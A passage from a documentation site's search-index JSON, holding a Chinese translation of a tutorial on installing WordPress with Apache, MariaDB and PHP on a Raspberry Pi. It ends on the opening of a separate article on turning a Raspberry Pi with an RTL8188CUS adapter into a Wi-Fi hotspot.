WordPress"},{"location":"RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/#wordpress","text":"\u8fd9\u7bc7\u7b80\u5355\u7684\u6559\u7a0b\u53ef\u4ee5\u8ba9\u4f60\u5728\u6811\u8393\u6d3e\u4e0a\u8fd0\u884c\u4f60\u7684 WordPress \u7f51\u7ad9\u3002 WordPress \u662f\u4e00\u4e2a\u975e\u5e38\u53d7\u6b22\u8fce\u7684\u5f00\u6e90\u535a\u5ba2\u5e73\u53f0\u548c\u5185\u5bb9\u7ba1\u7406\u5e73\u53f0\uff08CMS)\u3002\u5b83\u5f88\u5bb9\u6613\u642d\u5efa\uff0c\u800c\u4e14\u8fd8\u6709\u4e00\u4e2a\u6d3b\u8dc3\u7684\u5f00\u53d1\u8005\u793e\u533a\u6784\u5efa\u7f51\u7ad9\u3001\u521b\u5efa\u4e3b\u9898\u548c\u63d2\u4ef6\u4f9b\u5176\u4ed6\u4eba\u4f7f\u7528\u3002 \u867d\u7136\u901a\u8fc7\u4e00\u952e\u5f0f WordPress \u8bbe\u7f6e\u83b7\u5f97\u6258\u7ba1\u5305\u5f88\u5bb9\u6613\uff0c\u4f46\u4e5f\u53ef\u4ee5\u7b80\u5355\u5730\u901a\u8fc7\u547d\u4ee4\u884c\u5728 Linux \u670d\u52a1\u5668\u4e0a\u8bbe\u7f6e\u81ea\u5df1\u7684\u6258\u7ba1\u5305\uff0c\u800c\u4e14\u6811\u8393\u6d3e\u662f\u4e00\u79cd\u7528\u6765\u5c1d\u8bd5\u5b83\u5e76\u987a\u4fbf\u5b66\u4e60\u4e00\u4e9b\u4e1c\u897f\u7684\u76f8\u5f53\u597d\u7684\u9014\u5f84\u3002 \u4e00\u4e2a\u7ecf\u5e38\u4f7f\u7528\u7684 Web \u5957\u4ef6\u7684\u56db\u4e2a\u90e8\u5206\u662f Linux\u3001Apache\u3001MySQL \u548c PHP\u3002\u8fd9\u91cc\u662f\u4f60\u5bf9\u5b83\u4eec\u6bcf\u4e00\u4e2a\u9700\u8981\u4e86\u89e3\u7684\u3002","title":"\u5982\u4f55\u5728\u6811\u8393\u6d3e\u4e0a\u642d\u5efa WordPress"},{"location":"RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/#linux","text":"\u6811\u8393\u6d3e\u4e0a\u8fd0\u884c\u7684\u7cfb\u7edf\u662f Raspbian\uff0c\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8e Debian\uff0c\u4e3a\u8fd0\u884c\u5728\u6811\u8393\u6d3e\u786c\u4ef6\u4e0a\u800c\u4f18\u5316\u7684\u5f88\u597d\u7684 Linux \u53d1\u884c\u7248\u3002\u4f60\u6709\u4e24\u4e2a\u9009\u62e9\uff1a\u684c\u9762\u7248\u6216\u662f\u7cbe\u7b80\u7248\u3002\u684c\u9762\u7248\u6709\u4e00\u4e2a\u719f\u6089\u7684\u684c\u9762\u8fd8\u6709\u5f88\u591a\u6559\u80b2\u8f6f\u4ef6\u548c\u7f16\u7a0b\u5de5\u5177\uff0c\u50cf\u662f LibreOffice \u5957\u4ef6\u3001Mincraft\uff0c\u8fd8\u6709\u4e00\u4e2a web \u6d4f\u89c8\u5668\u3002\u7cbe\u7b80\u7248\u672c\u6ca1\u6709\u684c\u9762\u73af\u5883\uff0c\u56e0\u6b64\u5b83\u53ea\u6709\u547d\u4ee4\u884c\u4ee5\u53ca\u4e00\u4e9b\u5fc5\u8981\u7684\u8f6f\u4ef6\u3002 \u8fd9\u7bc7\u6559\u7a0b\u5728\u4e24\u4e2a\u7248\u672c\u4e0a\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u4f46\u662f\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662f\u7cbe\u7b80\u7248\uff0c\u4f60\u5fc5\u987b\u8981\u6709\u53e6\u5916\u4e00\u53f0\u7535\u8111\u53bb\u8bbf\u95ee\u4f60\u7684\u7ad9\u70b9\u3002","title":"Linux"},{"location":"RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/#apache","text":"Apache \u662f\u4e00\u4e2a\u53d7\u6b22\u8fce\u7684 web \u670d\u52a1\u5668\u5e94\u7528\uff0c\u4f60\u53ef\u4ee5\u5b89\u88c5\u5728\u4f60\u7684\u6811\u8393\u6d3e\u4e0a\u4f3a\u670d\u4f60\u7684 web \u9875\u9762\u3002\u5c31\u5176\u81ea\u8eab\u800c\u8a00\uff0cApache \u53ef\u4ee5\u901a\u8fc7 HTTP \u63d0\u4f9b\u9759\u6001 HTML \u6587\u4ef6\u3002\u4f7f\u7528\u989d\u5916\u7684\u6a21\u5757\uff0c\u5b83\u4e5f\u53ef\u4ee5\u4f7f\u7528\u50cf\u662f PHP \u7684\u811a\u672c\u8bed\u8a00\u63d0\u4f9b\u52a8\u6001\u7f51\u9875\u3002 \u5b89\u88c5 Apache \u975e\u5e38\u7b80\u5355\u3002\u6253\u5f00\u4e00\u4e2a\u7ec8\u7aef\u7a97\u53e3\uff0c\u7136\u540e\u8f93\u5165\u4e0b\u9762\u7684\u547d\u4ee4\uff1a sudo apt install apache2 -y Apache \u9ed8\u8ba4\u653e\u4e86\u4e00\u4e2a\u6d4b\u8bd5\u6587\u4ef6\u5728\u4e00\u4e2a web \u76ee\u5f55\u4e2d\uff0c\u4f60\u53ef\u4ee5\u4ece\u4f60\u7684\u7535\u8111\u6216\u662f\u4f60\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u8ba1\u7b97\u673a\u8fdb\u884c\u8bbf\u95ee\u3002\u53ea\u9700\u8981\u6253\u5f00 web \u6d4f\u89c8\u5668\uff0c\u7136\u540e\u8f93\u5165\u5730\u5740 <http://localhost> \u3002\u6216\u8005\uff08\u7279\u522b\u662f\u4f60\u4f7f\u7528\u7684\u662f Raspbian Lite \u7684\u8bdd\uff09\u8f93\u5165\u4f60\u7684\u6811\u8393\u6d3e\u7684 IP \u5730\u5740\u4ee3\u66ff localhost \u3002\u4f60\u5e94\u8be5\u4f1a\u5728\u4f60\u7684\u6d4f\u89c8\u5668\u7a97\u53e3\u4e2d\u770b\u5230\u8fd9\u6837\u7684\u5185\u5bb9\uff1a \u8fd9\u610f\u5473\u7740\u4f60\u7684 Apache \u5df2\u7ecf\u5f00\u59cb\u5de5\u4f5c\u4e86\uff01 \u8fd9\u4e2a\u9ed8\u8ba4\u7684\u7f51\u9875\u4ec5\u4ec5\u662f\u4f60\u6587\u4ef6\u7cfb\u7edf\u91cc\u7684\u4e00\u4e2a\u6587\u4ef6\u3002\u5b83\u5728\u4f60\u672c\u5730\u7684 /var/www/html/index/html \u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 Leafpad \u6587\u672c\u7f16\u8f91\u5668\u5199\u4e00\u4e9b HTML \u53bb\u66ff\u6362\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002 cd /var/www/html/ sudo leafpad index.html \u4fdd\u5b58\u5e76\u5173\u95ed Leafpad \u7136\u540e\u5237\u65b0\u7f51\u9875\uff0c\u67e5\u770b\u4f60\u7684\u66f4\u6539\u3002","title":"Apache"},{"location":"RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/#mysql","text":"MySQL\uff08\u8bfb\u4f5c \u201cmy S-Q-L\u201d \u6216\u8005 \u201cmy sequel\u201d\uff09\u662f\u4e00\u4e2a\u5f88\u53d7\u6b22\u8fce\u7684\u6570\u636e\u5e93\u5f15\u64ce\u3002\u5c31\u50cf PHP\uff0c\u5b83\u88ab\u975e\u5e38\u5e7f\u6cdb\u7684\u5e94\u7528\u4e8e\u7f51\u9875\u670d\u52a1\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u50cf WordPress \u4e00\u6837\u7684\u9879\u76ee\u9009\u62e9\u4e86\u5b83\uff0c\u4ee5\u53ca\u8fd9\u4e9b\u9879\u76ee\u662f\u4e3a\u4f55\u5982\u6b64\u53d7\u6b22\u8fce\u3002 \u5728\u4e00\u4e2a\u7ec8\u7aef\u7a97\u53e3\u4e2d\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5 MySQL \u670d\u52a1\uff08LCTT \u8bd1\u6ce8\uff1a\u5b9e\u9645\u4e0a\u5b89\u88c5\u7684\u662f MySQL \u5206\u652f MariaDB\uff09\uff1a sudo apt-get install mysql-server -y WordPress \u4f7f\u7528 MySQL \u5b58\u50a8\u6587\u7ae0\u3001\u9875\u9762\u3001\u7528\u6237\u6570\u636e\u3001\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u7684\u5185\u5bb9\u3002","title":"MySQL"},{"location":"RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/#php","text":"PHP \u662f\u4e00\u4e2a\u9884\u5904\u7406\u5668\uff1a\u5b83\u662f\u5728\u670d\u52a1\u5668\u901a\u8fc7\u7f51\u7edc\u6d4f\u89c8\u5668\u63a5\u53d7\u7f51\u9875\u8bf7\u6c42\u662f\u8fd0\u884c\u7684\u4ee3\u7801\u3002\u5b83\u89e3\u51b3\u90a3\u4e9b\u9700\u8981\u5c55\u793a\u5728\u7f51\u9875\u4e0a\u7684\u5185\u5bb9\uff0c\u7136\u540e\u53d1\u9001\u8fd9\u4e9b\u7f51\u9875\u5230\u6d4f\u89c8\u5668\u4e0a\u3002\u4e0d\u50cf\u9759\u6001\u7684 HTML\uff0cPHP \u80fd\u5728\u4e0d\u540c\u7684\u60c5\u51b5\u4e0b\u5c55\u793a\u4e0d\u540c\u7684\u5185\u5bb9\u3002PHP \u662f\u4e00\u4e2a\u5728 web \u4e0a\u975e\u5e38\u53d7\u6b22\u8fce\u7684\u8bed\u8a00\uff1b\u5f88\u591a\u50cf Facebook \u548c Wikipedia \u7684\u9879\u76ee\u90fd\u4f7f\u7528 PHP \u7f16\u5199\u3002 \u5b89\u88c5 PHP \u548c MySQL \u7684\u63d2\u4ef6\uff1a sudo apt-get install php php-mysql -y \u5220\u9664 index.html \uff0c\u7136\u540e\u521b\u5efa index.php \uff1a sudo rm index.html sudo leafpad index.php \u5728\u91cc\u9762\u6dfb\u52a0\u4ee5\u4e0b\u5185\u5bb9\uff1a <?php phpinfo(); ?> \u4fdd\u5b58\u3001\u9000\u51fa\u3001\u5237\u65b0\u4f60\u7684\u7f51\u9875\u3002\u4f60\u5c06\u4f1a\u770b\u5230 PHP \u72b6\u6001\u9875\uff1a","title":"PHP"},{"location":"RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/#wordpress_1","text":"\u4f60\u53ef\u4ee5\u4f7f\u7528 wget \u547d\u4ee4\u4ece wordpress.org \u4e0b\u8f7d WordPress\u3002\u6700\u65b0\u7684 WordPress \u603b\u662f\u4f7f\u7528 wordpress.org/latest.tar.gz \u8fd9\u4e2a\u7f51\u5740\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u76f4\u63a5\u6293\u53d6\u8fd9\u4e9b\u6587\u4ef6\uff0c\u800c\u65e0\u9700\u5230\u7f51\u9875\u91cc\u9762\u67e5\u770b\uff0c\u73b0\u5728\u7684\u7248\u672c\u662f 4.9.8\u3002 \u786e\u4fdd\u4f60\u5728 /var/www/html \u76ee\u5f55\u4e2d\uff0c\u7136\u540e\u5220\u9664\u91cc\u9762\u7684\u6240\u6709\u5185\u5bb9\uff1a cd /var/www/html/ sudo rm * \u4f7f\u7528 wget \u4e0b\u8f7d WordPress\uff0c\u7136\u540e\u63d0\u53d6\u91cc\u9762\u7684\u5185\u5bb9\uff0c\u5e76\u79fb\u52a8\u63d0\u53d6\u7684 WordPress \u76ee\u5f55\u4e2d\u7684\u5185\u5bb9\u79fb\u52a8\u5230 html \u76ee\u5f55\u4e0b\uff1a sudo wget http://wordpress.org/latest.tar.gz sudo tar xzf latest.tar.gz sudo mv wordpress/* . \u73b0\u5728\u53ef\u4ee5\u5220\u9664\u538b\u7f29\u5305\u548c\u7a7a\u7684 wordpress \u76ee\u5f55\u4e86\uff1a sudo rm -rf wordpress latest.tar.gz \u8fd0\u884c ls \u6216\u8005 tree -L 1 \u547d\u4ee4\u663e\u793a WordPress \u9879\u76ee\u4e0b\u5305\u542b\u7684\u5185\u5bb9\uff1a . \u251c\u2500\u2500 index.php \u251c\u2500\u2500 license.txt \u251c\u2500\u2500 readme.html \u251c\u2500\u2500 wp-activate.php \u251c\u2500\u2500 wp-admin \u251c\u2500\u2500 wp-blog-header.php \u251c\u2500\u2500 wp-comments-post.php \u251c\u2500\u2500 wp-config-sample.php \u251c\u2500\u2500 wp-content \u251c\u2500\u2500 wp-cron.php \u251c\u2500\u2500 wp-includes \u251c\u2500\u2500 wp-links-opml.php \u251c\u2500\u2500 wp-load.php \u251c\u2500\u2500 wp-login.php \u251c\u2500\u2500 wp-mail.php \u251c\u2500\u2500 wp-settings.php \u251c\u2500\u2500 wp-signup.php \u251c\u2500\u2500 wp-trackback.php \u2514\u2500\u2500 xmlrpc.php 3 directories, 16 files \u8fd9\u662f WordPress \u7684\u9ed8\u8ba4\u5b89\u88c5\u6e90\u3002\u5728 wp-content \u76ee\u5f55\u4e2d\uff0c\u4f60\u53ef\u4ee5\u7f16\u8f91\u4f60\u7684\u81ea\u5b9a\u4e49\u5b89\u88c5\u3002 \u4f60\u73b0\u5728\u5e94\u8be5\u628a\u6240\u6709\u6587\u4ef6\u7684\u6240\u6709\u6743\u6539\u4e3a Apache \u7684\u8fd0\u884c\u7528\u6237 www-data \uff1a sudo chown -R www-data: .","title":"WordPress"},{"location":"RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/#wordpress_2","text":"\u4e3a\u4e86\u642d\u5efa\u4f60\u7684 WordPress \u7ad9\u70b9\uff0c\u4f60\u9700\u8981\u4e00\u4e2a\u6570\u636e\u5e93\u3002\u8fd9\u91cc\u4f7f\u7528\u7684\u662f MySQL\u3002 \u5728\u7ec8\u7aef\u7a97\u53e3\u8fd0\u884c MySQL \u7684\u5b89\u5168\u5b89\u88c5\u547d\u4ee4\uff1a sudo mysql_secure_installation \u4f60\u5c06\u4f1a\u88ab\u95ee\u5230\u4e00\u7cfb\u5217\u7684\u95ee\u9898\u3002\u8fd9\u91cc\u539f\u6765\u6ca1\u6709\u8bbe\u7f6e\u5bc6\u7801\uff0c\u4f46\u662f\u5728\u4e0b\u4e00\u6b65\u4f60\u5e94\u8be5\u8bbe\u7f6e\u4e00\u4e2a\u3002\u786e\u4fdd\u4f60\u8bb0\u4f4f\u4e86\u4f60\u8f93\u5165\u7684\u5bc6\u7801\uff0c\u540e\u9762\u4f60\u9700\u8981\u4f7f\u7528\u5b83\u53bb\u8fde\u63a5\u4f60\u7684 WordPress\u3002\u6309\u56de\u8f66\u786e\u8ba4\u4e0b\u9762\u7684\u6240\u6709\u95ee\u9898\u3002 \u5f53\u5b83\u5b8c\u6210\u4e4b\u540e\uff0c\u4f60\u5c06\u4f1a\u770b\u5230 \u201cAll done!\u201d \u548c \u201cThanks for using MariaDB!\u201d \u7684\u4fe1\u606f\u3002 \u5728\u7ec8\u7aef\u7a97\u53e3\u8fd0\u884c mysql \u547d\u4ee4\uff1a sudo mysql -uroot -p \u8f93\u5165\u4f60\u521b\u5efa\u7684 root \u5bc6\u7801\uff08LCTT \u8bd1\u6ce8\uff1a\u4e0d\u662f Linux \u7cfb\u7edf\u7684 root \u5bc6\u7801\uff0c\u662f MySQL \u7684 root \u5bc6\u7801\uff09\u3002\u4f60\u5c06\u770b\u5230 \u201cWelcome to the MariaDB monitor.\u201d \u7684\u6b22\u8fce\u4fe1\u606f\u3002\u5728 \u201cMariaDB [(none)] >\u201d \u63d0\u793a\u5904\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff0c\u4e3a\u4f60 WordPress \u7684\u5b89\u88c5\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u5e93\uff1a create database wordpress; \u6ce8\u610f\u58f0\u660e\u6700\u540e\u7684\u5206\u53f7\uff0c\u5982\u679c\u547d\u4ee4\u6267\u884c\u6210\u529f\uff0c\u4f60\u5c06\u770b\u5230\u4e0b\u9762\u7684\u63d0\u793a\uff1a Query OK, 1 row affected (0.00 sec) \u628a\u6570\u636e\u5e93\u6743\u9650\u4ea4\u7ed9 root \u7528\u6237\u5728\u58f0\u660e\u7684\u5e95\u90e8\u8f93\u5165\u5bc6\u7801\uff1a GRANT ALL PRIVILEGES ON wordpress.* TO 'root'@'localhost' IDENTIFIED BY 'YOURPASSWORD'; \u4e3a\u4e86\u8ba9\u66f4\u6539\u751f\u6548\uff0c\u4f60\u9700\u8981\u5237\u65b0\u6570\u636e\u5e93\u6743\u9650\uff1a FLUSH PRIVILEGES; \u6309 Ctrl+D \u9000\u51fa MariaDB \u63d0\u793a\u7b26\uff0c\u8fd4\u56de\u5230 Bash shell\u3002","title":"WordPress \u6570\u636e\u5e93"},{"location":"RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/#wordpress_3","text":"\u5728\u4f60\u7684 \u6811\u8393\u6d3e \u6253\u5f00\u7f51\u9875\u6d4f\u89c8\u5668\uff0c\u5730\u5740\u680f\u8f93\u5165 http://localhost \u3002\u9009\u62e9\u4e00\u4e2a\u4f60\u60f3\u8981\u5728 WordPress \u4f7f\u7528\u7684\u8bed\u8a00\uff0c\u7136\u540e\u70b9\u51fb\u201cContinue\u201d\u3002\u4f60\u5c06\u4f1a\u770b\u5230 WordPress \u7684\u6b22\u8fce\u754c\u9762\u3002\u70b9\u51fb \u201cLet\u2019s go!\u201d \u6309\u94ae\u3002 \u6309\u7167\u4e0b\u9762\u8fd9\u6837\u586b\u5199\u57fa\u672c\u7684\u7ad9\u70b9\u4fe1\u606f\uff1a Database Name: wordpress User Name: root Password: <YOUR PASSWORD> Database Host: localhost Table Prefix: wp_ \u70b9\u51fb \u201cSubmit\u201d \u7ee7\u7eed\uff0c\u7136\u540e\u70b9\u51fb \u201cRun the install\u201d\u3002 \u6309\u4e0b\u9762\u7684\u683c\u5f0f\u586b\u5199\uff1a\u4e3a\u4f60\u7684\u7ad9\u70b9\u8bbe\u7f6e\u4e00\u4e2a\u6807\u9898\u3001\u521b\u5efa\u4e00\u4e2a\u7528\u6237\u540d\u548c\u5bc6\u7801\u3001\u8f93\u5165\u4f60\u7684 email \u5730\u5740\u3002\u70b9\u51fb \u201cInstall WordPress\u201d \u6309\u94ae\uff0c\u7136\u540e\u4f7f\u7528\u4f60\u521a\u521a\u521b\u5efa\u7684\u8d26\u53f7\u767b\u5f55\uff0c\u4f60\u73b0\u5728\u5df2\u7ecf\u767b\u5f55\uff0c\u800c\u4e14\u4f60\u7684\u7ad9\u70b9\u5df2\u7ecf\u8bbe\u7f6e\u597d\u4e86\uff0c\u4f60\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u8f93\u5165 http://localhost/wp-admin \u67e5\u770b\u4f60\u7684\u7f51\u7ad9\u3002","title":"WordPress \u914d\u7f6e"},{"location":"RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/#_1","text":"\u66f4\u6539\u4f60\u7684\u6c38\u4e45\u94fe\u63a5\u8bbe\u7f6e\uff0c\u4f7f\u5f97\u4f60\u7684 URL \u66f4\u52a0\u53cb\u597d\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u60f3\u6cd5\u3002 \u8981\u8fd9\u6837\u505a\uff0c\u9996\u5148\u767b\u5f55\u4f60\u7684 WordPress \uff0c\u8fdb\u5165\u4eea\u8868\u76d8\u3002\u8fdb\u5165 \u201cSettings\u201d\uff0c\u201cPermalinks\u201d\u3002\u9009\u62e9 \u201cPost name\u201d \u9009\u9879\uff0c\u7136\u540e\u70b9\u51fb \u201cSave Changes\u201d\u3002\u63a5\u7740\u4f60\u9700\u8981\u5f00\u542f Apache \u7684 rewrite \u6a21\u5757\u3002 sudo a2enmod rewrite \u4f60\u8fd8\u9700\u8981\u544a\u8bc9\u865a\u62df\u6258\u7ba1\u670d\u52a1\uff0c\u7ad9\u70b9\u5141\u8bb8\u6539\u5199\u8bf7\u6c42\u3002\u4e3a\u4f60\u7684\u865a\u62df\u4e3b\u673a\u7f16\u8f91 Apache \u914d\u7f6e\u6587\u4ef6\uff1a sudo leafpad /etc/apache2/sites-available/000-default.conf \u5728\u7b2c\u4e00\u884c\u540e\u6dfb\u52a0\u4e0b\u9762\u7684\u5185\u5bb9\uff1a <Directory \"/var/www/html\"> AllowOverride All </Directory> \u786e\u4fdd\u5176\u4e2d\u6709\u50cf\u8fd9\u6837\u7684\u5185\u5bb9 <VirtualHost *:80> \uff1a <VirtualHost *:80> <Directory \"/var/www/html\"> AllowOverride All </Directory> ... \u4fdd\u5b58\u8fd9\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u9000\u51fa\uff0c\u91cd\u542f Apache\uff1a sudo systemctl restart apache2","title":"\u6c38\u4e45\u94fe\u63a5"},{"location":"RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/#_2","text":"WordPress \u662f\u53ef\u4ee5\u9ad8\u5ea6\u81ea\u5b9a\u4e49\u7684\u3002\u5728\u7f51\u7ad9\u9876\u90e8\u6a2a\u5e45\u5904\u70b9\u51fb\u4f60\u7684\u7ad9\u70b9\u540d\uff0c\u4f60\u5c31\u4f1a\u8fdb\u5165\u4eea\u8868\u76d8\u3002\u5728\u8fd9\u91cc\u4f60\u53ef\u4ee5\u4fee\u6539\u4e3b\u9898\u3001\u6dfb\u52a0\u9875\u9762\u548c\u6587\u7ae0\u3001\u7f16\u8f91\u83dc\u5355\u3001\u6dfb\u52a0\u63d2\u4ef6\u3001\u4ee5\u53ca\u8bb8\u591a\u5176\u4ed6\u7684\u4e8b\u60c5\u3002 \u8fd9\u91cc\u6709\u4e00\u4e9b\u4f60\u53ef\u4ee5\u5728\u6811\u8393\u6d3e\u7684\u7f51\u9875\u670d\u52a1\u4e0a\u5c1d\u8bd5\u7684\u6709\u8da3\u7684\u4e8b\u60c5\uff1a \u6dfb\u52a0\u9875\u9762\u548c\u6587\u7ae0\u5230\u4f60\u7684\u7f51\u7ad9 \u4ece\u5916\u89c2\u83dc\u5355\u5b89\u88c5\u4e0d\u540c\u7684\u4e3b\u9898 \u81ea\u5b9a\u4e49\u4f60\u7684\u7f51\u7ad9\u4e3b\u9898\u6216\u662f\u521b\u5efa\u4f60\u81ea\u5df1\u7684 \u4f7f\u7528\u4f60\u7684\u7f51\u7ad9\u670d\u52a1\u5411\u4f60\u7684\u7f51\u7edc\u4e0a\u7684\u5176\u4ed6\u4eba\u663e\u793a\u6709\u7528\u7684\u4fe1\u606f \u4e0d\u8981\u5fd8\u8bb0\uff0c\u6811\u8393\u6d3e\u662f\u4e00\u53f0 Linux \u7535\u8111\u3002\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u7ed3\u6784\u5728\u8fd0\u884c\u7740 Debian \u6216\u8005 Ubuntu \u7684\u670d\u52a1\u5668\u4e0a\u5b89\u88c5 WordPress\u3002 via: https://opensource.com/article/18/10/setting-wordpress-raspberry-pi \u539f\u6587\u94fe\u63a5\uff1a https://linux.cn/article-10208-1.html","title":"\u4e0b\u4e00\u6b65\uff1f"},{"location":"RPI/%E5%B0%86%E6%A0%91%E8%8E%93%E6%B4%BERaspberry%20Pi%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%28WiFi%E7%83%AD%E7%82%B9AP%2CRTL8188CUS%E8%8A%AF%E7%89%87%29/","text":"\u5c06\u6811\u8393\u6d3eRaspberry Pi\u8bbe\u7f6e\u4e3a\u65e0\u7ebf\u8def\u7531\u5668(WiFi\u70ed\u70b9AP,RTL8188CUS\u82af\u7247) \u63d0\u9192\uff1a \u672c\u9875\u9762\u5c06\u4e0d\u518d\u66f4\u65b0\u3001\u7ef4\u62a4\u6216\u8005\u652f\u6301\uff0c\u6587\u7ae0\u3001\u8bc4\u8bba\u6240\u53d9\u8ff0\u5185\u5bb9\u5b58\u5728\u65f6\u6548\u6027\uff0c\u6d89\u53ca\u6280\u672f\u7ec6\u8282\u6216\u8005\u8f6f\u4ef6\u4f7f\u7528\u65b9\u9762\u4e0d\u4fdd\u8bc1\u80fd\u591f\u5b8c\u5168\u6709\u6548\u53ef\u64cd\u4f5c\uff0c\u8bf7\u8c28\u614e\u53c2\u8003\uff01 \u6700\u8fd1\u53c8\u5f00\u59cb\u6298\u817e\u8d77Raspberry Pi\u6765\u4e86\uff0c\u56e0\u4e3a\u67d0\u5904\u4e0a\u7f51\u9700\u8981\u9510\u6377\u62e8\u53f7\uff0c\u4e8e\u662f\u6211\u5c31\u60f3\u80fd\u4e0d\u80fd\u8ba9\u6211\u7684\u6811\u8393\u6d3e\u4ee3\u52b3\uff0c\u5f53\u7136\u9996\u5148\u8981\u5c06\u5176\u6539\u9020\u4e3a\u8def\u7531\u5668\uff0c\u9ed8\u8ba4\u81ea\u5e26\u7684\u7f51\u53e3\u4f5c\u4e3aWAN\u53e3\uff0c\u6211\u4eec\u8fd8\u7f3a\u4e00\u4e2a\u7f51\u53e3\uff0c\u6728\u6709\u529e\u6cd5\uff0c\u53ea\u597d\u5360\u7528\u4e00\u4e2aUSB\u53e3\uff0c\u63a5\u4e0a\u4e00\u4e2aUSB\u7f51\u5361\uff0c\u7f51\u4e0a\u7684USB\u8f6cRJ45\u7f51\u7ebf\u53e3\u7684\u9002\u914d\u5668\u6bd4\u8f83\u5c11\uff0c\u4ef7\u683c\u4e5f\u4e0d\u4fbf\u5b9c\uff0c\u4e8e\u662f\u5c31\u8003\u8651\u5e72\u8106\u5c06\u5176\u6539\u9020\u6210\u65e0\u7ebf\u8def\u7531\uff0c\u4e5f\u7b26\u5408\u65f6\u4e0b\u9ad8\u7aef\u5927\u6c14\u4e0a\u6863\u6b21\u7684\u6807\u51c6\u3002 \u51c6\u5907\u5de5\u4f5c\uff0c\u5f53\u7136\u8981\u5148\u53bb\u8d2d\u4e70\u4e00\u4e2aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u53ef\u4ee5\u8d2d\u4e70\u7684\u578b\u53f7\u6bd4\u8f83\u591a\uff0cRaspberry Pi\u5b98\u65b9\u4e5f\u63d0\u4f9b\u4e86 \u517c\u5bb9\u6027\u5217\u8868 \u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5177\u4f53\u731b\u51fb\u8fd9\u91cc\u3002\u6211\u8fd9\u91cc\u8d2d\u4e70\u7684\u662f \u7f51\u4ef6\uff08Netgear\uff09WNA1000M 150M\u8ff7\u4f60USB\u65e0\u7ebf\u7f51\u5361 \u3002 \u8f83\u4e3a\u5b98\u65b9\u7684\u4ecb\u7ecd\u914d\u7f6e\u4e3a\u65e0\u7ebf\u70ed\u70b9\u7684\u6587\u7ae0\u83ab\u8fc7\u4e8e\u8fd9\u4e00\u7bc7 \u300aRPI-Wireless-Hotspot\u300b \u3002\u4f46\u662f\u5b9e\u9645\u914d\u7f6e\u4e0b\u6765\u59cb\u7ec8\u65e0\u6cd5\u6210\u529f\u3002\u4f46\u662f\u65e0\u7ebf\u7f51\u5361\u786e\u5b9e\u80fd\u591f\u88ab\u8bc6\u522b\uff0c\u53ef\u4ee5\u901a\u8fc7 lsusb \u548c lsmod \u67e5\u770b\u5230\uff0c\u4e0d\u8fc7\u6211\u6ce8\u610f\u5230\u8fd9\u6b3e\u65e0\u7ebf\u7684\u82af\u7247\u578b\u53f7\u662fRealTek RTL8188CUS\uff0c\u521d\u6b65\u6000\u7591\u662f\u9a71\u52a8\u95ee\u9898\u3002 \u5f53\u7136\u770b\u5230\u522b\u4eba\u7684\u8001\u6b3e\u65e0\u7ebf\u7f51\u5361\u90fd\u914d\u7f6e\u6210\u529f\u4e86\u5fc3\u91cc\u96be\u514d\u75d2\u75d2\u7684\uff0c\u5f53\u7136\u4e5f\u4e0d\u80fd\u518d\u6d6a\u8d39\u94f6\u5b50\u53bb\u518d\u4e70\u4e2a\u7f51\u5361\uff0c\u4e8e\u662f\u53ea\u597d\u81ea\u5df1\u6478\u7d22\uff0c\u4e0d\u8fc7\u5929\u65e0\u7edd\u4eba\u4e4b\u8def\uff0c\u5728N\u6b21\u5237\u673a\u91cd\u88c5\u7cfb\u7edf\u540e\uff0c\u7ec8\u4e8e\u627e\u5230\u4e86\u6210\u529f\u7684\u529e\u6cd5\uff0c\u5176\u5b9e\u5173\u952e\u7684\u6587\u7ae0\u5c31\u5728\u4e0a\u9762\u90a3\u7bc7\u6587\u7ae0\u7684\u4e00\u4e2a\u94fe\u63a5\u4e2d \u300aTurn Your Raspberry Pi Into a WiFi Hotspot with Edimax Nano USB EW-7811Un (RTL8188CUS 